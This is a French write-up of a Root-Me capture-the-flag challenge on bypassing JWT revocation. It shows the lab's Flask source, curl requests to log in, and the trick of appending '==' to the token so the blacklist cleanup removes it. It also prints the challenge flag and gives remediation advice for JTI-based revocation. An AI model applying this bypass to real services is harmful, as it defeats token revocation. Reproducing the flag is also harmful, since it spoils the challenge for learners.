# Root-Me – Challenge 6 : JWT - Jeton révoqué

## 1. Nom du challenge & URL

**Nom** : Challenge 6 – JWT - Jeton révoqué

**URL** : `http://challenge01.root-me.org/web-serveur/ch63/`

---

## 2. Objectif

Le but du challenge est d'exploiter une vulnérabilité dans la gestion des **tokens JWT révoqués** pour obtenir un accès à l'endpoint `/web-serveur/ch63/admin`.

**Endpoints disponibles :**
* **POST** : `/web-serveur/ch63/login` - Pour obtenir un token JWT
* **GET** : `/web-serveur/ch63/admin` - Endpoint protégé nécessitant un token valide

---

## 3. Étapes de découverte de la vulnérabilité

1. En arrivant sur la page du challenge, on voit deux endpoints disponibles ainsi que le code source Python.

   ```
   #!/usr/bin/env python3
   # -*- coding: utf-8 -*-
   from flask import Flask, request, jsonify
   from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
   import datetime
   #from apscheduler.schedulers.background import BackgroundScheduler
   import threading
   import jwt
   from config import *
   
   # Setup flask
   app = Flask(__name__)
   
   app.config['JWT_SECRET_KEY'] = SECRET
   jwtmanager = JWTManager(app)
   blacklist = set()
   lock = threading.Lock()
   
   # Free memory from expired tokens, as they are no longer useful
   def delete_expired_tokens():
       with lock:
           to_remove = set()
           global blacklist
           for access_token in blacklist:
               try:
                   jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
               except:
                   to_remove.add(access_token)
           
           blacklist = blacklist.difference(to_remove)
   
   @app.route("/web-serveur/ch63/")
   def index():
       return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
   
   # Standard login endpoint
   @app.route('/web-serveur/ch63/login', methods=['POST'])
   def login():
       try:
           username = request.json.get('username', None)
           password = request.json.get('password', None)
       except:
           return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
   
       if username != 'admin' or password != 'admin':
           return jsonify({"msg": "Bad username or password"}), 401
   
       access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
       ret = {
           'access_token': access_token,
       }
       
       with lock:
           blacklist.add(access_token)
   
       return jsonify(ret), 200
   
   # Standard admin endpoint
   @app.route('/web-serveur/ch63/admin', methods=['GET'])
   @jwt_required
   def protected():
       access_token = request.headers.get("Authorization").split()[1]
       with lock:
           if access_token in blacklist:
               return jsonify({"msg":"Token is revoked"})
           else:
               return jsonify({'Congratzzzz!!!_flag:': FLAG})
   
   
   if __name__ == '__main__':
       scheduler = BackgroundScheduler()
       job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
       scheduler.start()
       app.run(debug=False, host='0.0.0.0', port=5000)
   ```

2. On commence par tester l'endpoint `/login` avec les credentials `admin:admin` :

   ```bash
   curl -X POST http://challenge01.root-me.org/web-serveur/ch63/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"admin"}'
   ```

3. On obtient un token JWT en réponse :

   ```json
   {
   "access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjM5MTA3MzUsIm5iZiI6MTc2MzkxMDczNSwianRpIjoiOGE0ZTdiYmEtMDFmYS00NjNjLTlhMGItMTg5MGFjMWYxZTNmIiwiZXhwIjoxNzYzOTEwOTE1LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.fwsM2M2oeinR8_JoFzR2qZF-X6kp_QyusLXLKnNW5Qk"
   }
   ```

4. Si on essaie d'utiliser ce token immédiatement pour accéder à `/admin`, on obtient :

   ```json
   {"msg":"Token is revoked"}
   ```

5. En analysant le code source, on découvre le problème :

   **Ligne 54** : Le token est ajouté à la blacklist **immédiatement** après sa création :
   ```python
   with lock:
       blacklist.add(access_token)
   ```

   **Lignes 20-30** : Une fonction `delete_expired_tokens()` nettoie la blacklist toutes les 10 secondes :
   ```python
   def delete_expired_tokens():
       with lock:
           to_remove = set()
           global blacklist
           for access_token in blacklist:
               try:
                   jwt.decode(access_token, app.config['JWT_SECRET_KEY'], algorithm='HS256')
               except:
                   to_remove.add(access_token)
           blacklist = blacklist.difference(to_remove)
   ```

La fonction `jwt.decode()` lève une exception si le token est **invalide** ou **expiré**. Dans ce cas, le token est ajouté à `to_remove` et supprimé de la blacklist.

6. Si on modifie légèrement le token en ajoutant un **padding Base64 invalide** (`==` à la fin), le token devient invalide pour le décodage mais reste accepté par la vérification de signature !

---

## 4. Payload utilisé

La solution consiste à ajouter `==` à la fin du token JWT obtenu, puis attendre que la fonction de nettoyage s'exécute.

```bash
# 1. Obtenir un token
curl -X POST http://challenge01.root-me.org/web-serveur/ch63/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# Token obtenu : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjM5MTA3MzUsIm5iZiI6MTc2MzkxMDczNSwianRpIjoiOGE0ZTdiYmEtMDFmYS00NjNjLTlhMGItMTg5MGFjMWYxZTNmIiwiZXhwIjoxNzYzOTEwOTE1LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.fwsM2M2oeinR8_JoFzR2qZF-X6kp_QyusLXLKnNW5Qk

# 2. Ajouter == à la fin du token
TOKEN_MODIFIE="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjM5MTA3MzUsIm5iZiI6MTc2MzkxMDczNSwianRpIjoiOGE0ZTdiYmEtMDFmYS00NjNjLTlhMGItMTg5MGFjMWYxZTNmIiwiZXhwIjoxNzYzOTEwOTE1LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.fwsM2M2oeinR8_JoFzR2qZF-X6kp_QyusLXLKnNW5Qk=="
```

### Explication du payload :

* **Ajout de `==`** : en Base64 (RFC 4648), le padding avec `=` est utilisé pour compléter l'encodage. Ajouter `==` à la fin rend le token invalide pour le décodage JWT
* **Utilisation immédiate** : une fois le token supprimé de la blacklist, on peut l'utiliser pour accéder à l'endpoint `/admin` avant qu'il n'expire au bout de 3 minutes

---

## 5. Résultat obtenu

Lorsqu'on utilise le token modifié après l'attente, on obtient :

```json
{
  "Congratzzzz!!!_flag:": "Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld"
}
```

**Le flag est** : `Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld`

Le challenge est validé !

![challenge6 resultat](images/challenge6.1.png)

---

## 6. Screenshot

Voici un screenshot prouvant que le challenge est terminé :

![challenge6 termine](images/challenge6.png)

---

## 7. Recommandations pour sécuriser la vulnérabilité

Pour corriger cette vulnérabilité de gestion de tokens JWT révoqués, il faut implémenter les mesures suivantes :

### 7.1. Utiliser le champ JTI (JWT ID) pour la blacklist

Au lieu de stocker le token complet dans la blacklist, utiliser uniquement le champ `jti` (JWT ID) [1] [2] :

```python
# Lors de la création du token
access_token = create_access_token(identity=username, expires_delta=datetime.timedelta(minutes=3))

# Décoder pour extraire le JTI
decoded = jwt.decode(access_token, app.config['JWT_SECRET_KEY'], algorithms=['HS256'])
jti = decoded['jti']

# Ajouter seulement le JTI à la blacklist
with lock:
    blacklist.add(jti)

# Lors de la vérification
@jwt_required
def protected():
    claims = get_jwt()
    jti = claims['jti']
    
    if jti in blacklist:
        return jsonify({"msg":"Token is revoked"}), 401
```

### 7.2. Valider strictement le format du token

Valider le format du token avant de le traiter [2] [3] :

```python
def is_valid_jwt_format(token):
    # Un JWT doit avoir exactement 3 parties séparées par des points
    parts = token.split('.')
    if len(parts) != 3:
        return False
    
    # Chaque partie doit être en Base64 valide (sans padding supplémentaire)
    for part in parts[:-1]:  # Header et Payload
        if part.endswith('='):
            return False
    
    return True

@app.route('/admin', methods=['GET'])
@jwt_required
def protected():
    token = request.headers.get("Authorization").split()[1]
    
    if not is_valid_jwt_format(token):
        return jsonify({"msg":"Invalid token format"}), 401
```

### 7.3. Utiliser une base de données pour la blacklist

Au lieu d'une structure en mémoire, utiliser une base de données avec expiration automatique [1] [4] :

```python
import redis

# Connexion Redis
redis_client = redis.Redis(host='localhost', port=6379, db=0)

# Ajouter un JTI à la blacklist avec expiration
def revoke_token(jti, expires_in_seconds):
    redis_client.setex(f"revoked:{jti}", expires_in_seconds, "1")

# Vérifier si un JTI est révoqué
def is_token_revoked(jti):
    return redis_client.exists(f"revoked:{jti}") > 0
```

### 7.4. Ne pas nettoyer la blacklist basé sur le décodage

La fonction de nettoyage ne devrait pas essayer de décoder les tokens. Utiliser plutôt l'expiration naturelle [1] [2] :

```python
# MAUVAIS - Décoder pour vérifier l'expiration
try:
    jwt.decode(access_token, secret_key, algorithms=['HS256'])
except:
    to_remove.add(access_token)

# BON - Stocker le JTI avec timestamp d'expiration
blacklist = {
    'jti123': {'exp': 1763910915},
    'jti456': {'exp': 1763910920}
}

# Nettoyer basé sur le timestamp
def delete_expired_tokens():
    current_time = time.time()
    to_remove = {jti for jti, data in blacklist.items() if data['exp'] < current_time}
    for jti in to_remove:
        del blacklist[jti]
```

### 7.5. Utiliser des tokens de courte durée avec refresh tokens

Implémenter un système de refresh tokens pour réduire la fenêtre d'exploitation [3] [4] :

```python
# Access token : courte durée (5-15 minutes)
access_token = create_access_token(identity=username, expires_delta=datetime.timedelta(minutes=5))

# Refresh token : longue durée (7-30 jours)
refresh_token = create_refresh_token(identity=username)
```

### 7.6. Implémenter une rotation de clés secrètes

Changer régulièrement la clé secrète pour invalider automatiquement les anciens tokens [4] [5] :

```python
# Système de rotation de clés
CURRENT_SECRET_KEY = "current_secret_key"
OLD_SECRET_KEYS = ["old_key_1", "old_key_2"]

def verify_token(token):
    # Essayer d'abord avec la clé actuelle
    try:
        return jwt.decode(token, CURRENT_SECRET_KEY, algorithms=['HS256'])
    except:
        # Essayer avec les anciennes clés
        for old_key in OLD_SECRET_KEYS:
            try:
                return jwt.decode(token, old_key, algorithms=['HS256'])
            except:
                continue
        raise InvalidTokenError()
```

---

## 8. Références

[1] [RFC 7519 – JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519) - Spécification JWT incluant le champ JTI

[2] [OWASP – JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) - Bonnes pratiques pour JWT

[3] [Attacking JWT authentication - Sjoerd Langkemper](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Attacking%20JWT%20authentication%20-%20Sjoerd%20Langkemper.pdf) - Techniques d'attaque JWT incluant l'algorithme "none" et le changement RS256 vers HS256

[4] [Hacking JSON Web Token (JWT) - Rudra Pratap](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Hacking%20JSON%20Web%20Token%20(JWT)%20-%20Rudra%20Pratap.pdf) - Guide complet sur les vulnérabilités JWT et leur exploitation

[5] [RFC 4648 – The Base16, Base32, and Base64 Data Encodings](https://tools.ietf.org/html/rfc4648) - Spécification du padding Base64 (clé pour comprendre cette vulnérabilité)

[6] [Auth0 – Blacklisting JSON Web Tokens](https://auth0.com/blog/blacklist-json-web-token-api-keys/) - Gestion de la révocation de tokens

[7] [Flask-JWT-Extended Documentation](https://flask-jwt-extended.readthedocs.io/) - Documentation sur la gestion des tokens JWT en Flask